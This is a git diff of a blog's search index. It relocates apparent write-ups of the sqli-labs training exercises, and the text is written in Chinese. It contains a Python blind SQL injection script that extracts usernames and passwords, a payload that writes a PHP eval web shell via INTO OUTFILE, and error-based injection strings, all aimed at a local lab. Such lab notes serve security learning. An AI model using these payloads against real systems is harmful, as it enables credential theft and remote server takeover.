@@ -75,21 +75,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-lab-less-7,8</title>
-    <url>/2024/10/30/less7-8/</url>
-    <content><![CDATA[<h3 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h3> <span id="more"></span>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="comment"># 1&#x27; and 1=1 --+                  #url=&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;+&quot;1&#x27; and &#x27;&quot;+c+&quot;&#x27; &gt; substr((select database() ),&quot;+idx+&quot;,1);--+&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):                                           <span class="comment">#select group_concat(table_name) from information_schema.tables where table_schema=database()</span></span><br><span class="line">    idx=<span class="built_in">str</span>(idx)                                                      <span class="comment">#select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;                                                                                        </span></span><br><span class="line">                                                                    </span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1)&lt;&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;;--+&quot;</span></span><br><span class="line">    res=requests.get(url) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行if          </span></span><br><span class="line"></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*You are in*&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径<br>id&#x3D;1’)) and (select count(*) from mysql.user)&gt;0 –+ 如果返回正常则有读取权限<br>参考: <a href="https://blog.csdn.net/m0_46315342/article/details/106557552">参考</a></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/sqli-labs-php7/Less-3/1.php&quot; -- +</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>sqli</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>sqli</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-lab-less-1,4,11</title>
     <url>/2024/10/14/less1,4,11/</url>
     <content><![CDATA[<p>这样会加载得更快吗<br> <span id="more"></span></p>
@@ -190,6 +175,21 @@ Your Password:3
       </tags>
   </entry>
   <entry>
+    <title>sqli-lab-less-7,8</title>
+    <url>/2024/10/30/less7-8/</url>
+    <content><![CDATA[<h3 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h3> <span id="more"></span>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="comment"># 1&#x27; and 1=1 --+                  #url=&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;+&quot;1&#x27; and &#x27;&quot;+c+&quot;&#x27; &gt; substr((select database() ),&quot;+idx+&quot;,1);--+&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):                                           <span class="comment">#select group_concat(table_name) from information_schema.tables where table_schema=database()</span></span><br><span class="line">    idx=<span class="built_in">str</span>(idx)                                                      <span class="comment">#select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;                                                                                        </span></span><br><span class="line">                                                                    </span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1)&lt;&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;;--+&quot;</span></span><br><span class="line">    res=requests.get(url) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行if          </span></span><br><span class="line"></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*You are in*&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径<br>id&#x3D;1’)) and (select count(*) from mysql.user)&gt;0 –+ 如果返回正常则有读取权限<br>参考: <a href="https://blog.csdn.net/m0_46315342/article/details/106557552">参考</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/sqli-labs-php7/Less-3/1.php&quot; -- +</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>sqli</category>
+      </categories>
+      <tags>
+        <tag>sqli</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>py爆破zip脚本</title>
     <url>/2024/10/28/py%E7%88%86%E7%A0%B4zip%E8%84%9A%E6%9C%AC/</url>
     <content><![CDATA[<p>于11-7优化<br> <span id="more"></span></p>
@@ -252,14 +252,15 @@ Your Password:3
         <category>sqli</category>
       </categories>
       <tags>
-        <tag>python</tag>
         <tag>sqli</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
     <title>sqli-labs,less-11,20</title>
     <url>/2024/11/21/sqli-labs-less-11-20/</url>
-    <content><![CDATA[<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2> <span id="more"></span>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>
 <h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">12</span>&quot;) union select 1,2#</span><br></pre></td></tr></table></figure>
 <h2 id="less-13-post报错注入"><a href="#less-13-post报错注入" class="headerlink" title="less-13 post报错注入"></a>less-13 post报错注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) and updatexml(1, SUBSTR(concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,  (select group_concat(table_name) from information_schema.tables where table_schema=database())  ),1,31), 3)#</span></span><br></pre></td></tr></table></figure>
 <h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>13改双引号</p>
@@ -279,8 +280,8 @@ Your Password:3
         <category>sqli</category>
       </categories>
       <tags>
-        <tag>python</tag>
         <tag>sqli</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
